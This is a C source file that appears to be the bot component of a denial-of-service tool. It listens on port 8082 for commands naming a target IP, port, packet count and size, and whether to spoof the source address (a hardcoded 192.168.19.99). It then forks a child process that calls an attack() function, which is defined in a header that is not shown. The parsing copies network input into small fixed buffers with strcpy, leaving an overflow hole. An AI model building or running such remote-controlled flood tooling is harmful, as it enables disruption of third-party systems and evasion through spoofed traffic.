#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>

#include "attack.h"
#include "listen.h"
int main(){
    srand(time(NULL)); 
    char buffer[1024];
    char operation[20];
    char DIP[16];
    char choise;
    unsigned int times, DPORT, pkt_size;
    
    char ** table = calloc(6, sizeof(char*));
    char *temp;
    
    while (1){
    	memset(buffer, 0, sizeof(buffer)); // Clear the buffer
    	memset(table, 0, 5 * sizeof(char*)); // Clear the table
        li(8082, sizeof(buffer), buffer);   // Call li with the buffer
        sleep(0.1);
                
        table[0] = strtok(buffer, "\n");
        int count = 0;
        while (table[count] != NULL) {	   
	    // Get the next token
	    table[++count] = strtok(NULL, "\n");
	}   
	
	
	strtok(table[0], " ");
	temp = strtok(NULL, "\n");	    
	strcpy(operation, temp);
	
	strtok(table[1], " ");
	temp = strtok(NULL, "\n");	    
	strcpy(DIP, temp);
	
	strtok(table[2], " ");
	temp = strtok(NULL, "\n");	
	DPORT = atoi(temp);
	
	strtok(table[3], " ");
	temp = strtok(NULL, "\n");	
	times = atoi(temp);
	
	strtok(table[4], " ");
	temp = strtok(NULL, "\n");	
	choise = temp[0];
	
	strtok(table[5], " ");
	temp = strtok(NULL, "\n");	
	pkt_size = atoi(temp);
	
	pid_t PID = fork();
	switch(PID){
	    case -1:
	    	perror("fork error");
        	exit(EXIT_FAILURE);
        	
	    case 0:
	        printf("Child's PID is %d\n", getpid());
	        char* SIP = ip_find();
	        if((choise == 'y')||(choise == 'Y')){
		    attack(DIP, "192.168.19.99", times, DPORT, 1234, pkt_size); 
		    break;  
		}
		else if((choise == 'n')||(choise == 'N')){
		    attack(DIP, SIP, times, DPORT, 1234, pkt_size);
		    break;   
		}
		exit(EXIT_SUCCESS);
		
	    default:
	    	wait(NULL);
	
	}
	
	
    }
    
    return 0;
}
